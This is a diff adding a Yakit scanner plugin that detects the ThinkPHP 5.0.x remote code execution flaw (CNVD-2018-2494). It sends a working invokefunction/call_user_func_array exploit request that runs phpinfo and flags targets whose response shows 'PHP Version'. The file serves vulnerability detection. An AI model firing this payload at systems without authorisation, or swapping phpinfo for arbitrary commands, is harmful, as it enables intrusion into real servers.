@@ -1,0 +1,76 @@
+# port scan plugin
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    packet = `
+GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1 HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+`
+
+    rsp,req,_ = poc.HTTP(packet, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+    
+    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+
+    // dump(rsp)
+    if len(rsp) > 0 {
+        if str.MatchAllOfSubString(body, `PHP Version`) {
+            yakit.Info("%v ThinkPHP5.0.21远程命令执行漏洞（CNVD-2018-2494）", addr)
+            risk.NewRisk(
+                addr,risk.title("ThinkPHP5.0.21远程命令执行漏洞（CNVD-2018-2494）"),
+                risk.severity("critical"),
+                risk.titleVerbose("ThinkPHP5.0.21远程命令执行漏洞（CNVD-2018-2494）"),
+                risk.type("RCE[ThinkPHP]"),
+            )
+        }
+    }
+
+    return
+}
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    // dump(result.GetServiceName())
+    // println("-------------------------------")
+    // dump(result.GetCPEs())
+    // println("-------------------------------")
+    // dump(result.GetDomains())
+    // println("-------------------------------")
+    // dump(result.GetHtmlTitle())
+    // println("-------------------------------")
+    // dump(result.GetProto())
+    // println("-------------------------------")
+    // dump(result.Fingerprint.banner)
+
+    phpversion = re.Find(result.GetServiceName(), `\[\d*\.\d*\.\d*`)
+    version = re.ReplaceAll(phpversion, `\[`, "")
+    if str.MatchAllOfSubString(version, `5.6.27`) {
+        yakit.Error("该地址PHP版本为5.6.27，payload可能会导致PHP程序崩溃，插件已取消运行")
+        return
+    }
+
+
+    if len(result.Fingerprint.HttpFlows)>0{
+        if str.MatchAllOfSubString(result.Fingerprint.banner, "ThinkPHP") {
+            handleCheck(result.Target,result.Port)
+        }
+    }
+    
+}
